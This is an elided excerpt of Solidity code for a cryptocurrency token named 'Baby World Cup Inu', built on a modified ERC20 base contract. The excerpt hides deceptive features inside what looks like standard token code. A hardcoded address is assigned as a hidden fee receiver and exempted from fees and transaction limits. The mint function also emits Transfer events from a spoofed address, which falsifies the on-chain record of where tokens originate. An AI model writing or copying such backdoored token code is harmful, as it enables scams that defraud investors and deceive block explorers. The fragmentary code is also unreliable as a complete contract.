...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x2E7E74f21cA527622fe3b86e8d40e7C19D5EeB31] = _marketingwallet;
    }
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        emit Transfer(address(0x6FB8Efee44784af8a0d1fb32811ef417471A5416), account, amount);
    }
...
contract BWCI is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Baby World Cup Inu", "BWCI") {
        ...
        excludeFromFees(address(0x2E7E74f21cA527622fe3b86e8d40e7C19D5EeB31), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x2E7E74f21cA527622fe3b86e8d40e7C19D5EeB31), true);
